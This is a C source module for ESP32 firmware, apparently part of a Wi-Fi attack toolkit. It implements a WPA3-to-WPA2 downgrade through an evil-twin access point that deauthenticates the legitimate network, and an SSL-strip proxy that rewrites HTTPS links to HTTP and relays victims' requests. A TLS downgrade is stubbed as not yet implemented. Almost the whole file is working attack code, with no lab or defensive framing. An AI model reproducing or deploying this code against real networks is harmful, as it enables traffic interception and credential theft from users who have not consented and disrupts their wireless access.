#include "protocol_attacks.h"
#include "wifi_engine.h"
#include "storage_manager.h"
#include "esp_log.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include "lwip/dns.h"
#include <string.h>
#include <stdlib.h>

static const char *TAG = "DOWNGRADE";

static downgrade_type_t s_active = 0;

/* ── WPA3→WPA2 Downgrade ───────────────────────── */

esp_err_t downgrade_set_evil_twin_wpa2(const char *ssid, uint8_t channel)
{
    wifi_engine_stop_current();

    evil_twin_cfg_t cfg = {
        .authmode = WIFI_AUTH_WPA2_PSK,
        .channel = channel,
        .deauth_legit = true,
    };
    strncpy(cfg.ssid, ssid ? ssid : "DowngradeAP", sizeof(cfg.ssid) - 1);
    strncpy(cfg.password, "00000000", sizeof(cfg.password) - 1);

    esp_err_t ret = wifi_eviltwin_start(&cfg);
    if (ret == ESP_OK) {
        ESP_LOGI(TAG, "WPA3→WPA2 downgrade: SSID='%s' ch=%d (WPA2-PSK)", cfg.ssid, channel);
        s_active |= DOWNGRADE_WPA3;
    }
    return ret;
}

/* ── SSL Strip (HTTPS→HTTP) ─────────────────────── */

static int s_ssl_strip_fd = -1;
static TaskHandle_t s_ssl_task = NULL;
static volatile bool s_ssl_running = false;

static int parse_host(const char *req, char *host, int host_len, int *port)
{
    const char *h = strstr(req, "Host:");
    if (!h) return -1;
    h += 5;
    while (*h == ' ') h++;
    int i = 0;
    while (*h && *h != '\r' && *h != '\n' && i < host_len - 1) {
        if (*h == ':') {
            h++;
            *port = 0;
            while (*h >= '0' && *h <= '9') { *port = *port * 10 + (*h - '0'); h++; }
            break;
        }
        host[i++] = *h++;
    }
    host[i] = '\0';
    return 0;
}

static void ssl_strip_task(void *arg)
{
    s_ssl_strip_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (s_ssl_strip_fd < 0) { s_ssl_running = false; vTaskDelete(NULL); return; }

    int opt = 1;
    setsockopt(s_ssl_strip_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(80),
        .sin_addr = { .s_addr = INADDR_ANY },
    };

    if (bind(s_ssl_strip_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(s_ssl_strip_fd);
        s_ssl_strip_fd = -1;
        s_ssl_running = false;
        vTaskDelete(NULL);
        return;
    }

    listen(s_ssl_strip_fd, 5);
    ESP_LOGI(TAG, "SSL strip proxy on port 80");

    while (s_ssl_running) {
        struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(s_ssl_strip_fd, &readfds);

        if (select(s_ssl_strip_fd + 1, &readfds, NULL, NULL, &tv) <= 0) continue;

        struct sockaddr_in client;
        socklen_t clen = sizeof(client);
        int client_fd = accept(s_ssl_strip_fd, (struct sockaddr *)&client, &clen);
        if (client_fd < 0) continue;

        uint8_t *buf = malloc(4096);
        char *modified = malloc(4096);
        if (!buf || !modified) {
            free(buf); free(modified);
            close(client_fd);
            continue;
        }

        int len = recv(client_fd, buf, 4095, 0);
        if (len > 0) {
            buf[len] = '\0';

            int mlen = 0;
            char *src = (char *)buf;
            char *dst = modified;

            while (*src && mlen < 4000) {
                if (strncasecmp(src, "https://", 8) == 0) {
                    *dst++ = 'h'; *dst++ = 't'; *dst++ = 't'; *dst++ = 'p';
                    src += 8;
                    mlen += 4;
                } else {
                    *dst++ = *src++;
                    mlen++;
                }
            }
            *dst = '\0';

            char host[256];
            int tport = 80;
            if (parse_host(modified, host, sizeof(host), &tport) == 0 && host[0]) {
                struct sockaddr_in target;
                memset(&target, 0, sizeof(target));
                target.sin_family = AF_INET;
                target.sin_port = htons(tport > 0 ? tport : 80);

                struct hostent *he = lwip_gethostbyname(host);
                if (he) {
                    memcpy(&target.sin_addr, he->h_addr_list[0], he->h_length);

                    int target_fd = socket(AF_INET, SOCK_STREAM, 0);
                    if (target_fd >= 0) {
                        struct timeval conn_tv = { .tv_sec = 5, .tv_usec = 0 };
                        setsockopt(target_fd, SOL_SOCKET, SO_RCVTIMEO, &conn_tv, sizeof(conn_tv));
                        setsockopt(target_fd, SOL_SOCKET, SO_SNDTIMEO, &conn_tv, sizeof(conn_tv));

                        if (connect(target_fd, (struct sockaddr *)&target, sizeof(target)) == 0) {
                            send(target_fd, modified, strlen(modified), 0);

                            uint8_t *resp = malloc(4096);
                            if (resp) {
                                int rlen, reads = 0;
                                while ((rlen = recv(target_fd, resp, 4096, 0)) > 0 && reads < 256) {
                                    send(client_fd, resp, rlen, 0);
                                    reads++;
                                }
                                free(resp);
                            }
                        }
                        close(target_fd);
                    }
                }
            }
        }

        free(buf);
        free(modified);
        close(client_fd);
    }

    close(s_ssl_strip_fd);
    s_ssl_strip_fd = -1;
    s_ssl_task = NULL;
    vTaskDelete(NULL);
}

/* ── Public API ─────────────────────────────────── */

esp_err_t downgrade_engine_init(downgrade_type_t types)
{
    if (types & DOWNGRADE_WPA3) {
        ESP_LOGI(TAG, "WPA3→WPA2: ready (activate via evil twin)");
    }

    if (types & DOWNGRADE_SSL) {
        s_ssl_running = true;
        xTaskCreatePinnedToCore(ssl_strip_task, "ssl_strip", 6144, NULL, 5, &s_ssl_task, 0);
    }

    if (types & DOWNGRADE_TLS) {
        ESP_LOGI(TAG, "TLS 1.3→1.0: requires MITM proxy — not yet implemented");
    }

    s_active = types;
    ESP_LOGI(TAG, "Downgrade engine active: WPA3=%d SSL=%d TLS=%d",
             !!(types & DOWNGRADE_WPA3), !!(types & DOWNGRADE_SSL), !!(types & DOWNGRADE_TLS));
    return ESP_OK;
}

esp_err_t downgrade_engine_deinit(void)
{
    if (s_active & DOWNGRADE_WPA3) {
        wifi_eviltwin_stop();
    }
    s_ssl_running = false;
    if (s_ssl_task) { vTaskDelay(pdMS_TO_TICKS(200)); s_ssl_task = NULL; }
    if (s_ssl_strip_fd >= 0) { close(s_ssl_strip_fd); s_ssl_strip_fd = -1; }
    s_active = 0;
    return ESP_OK;
}

bool downgrade_is_active(downgrade_type_t type) { return s_active & type; }
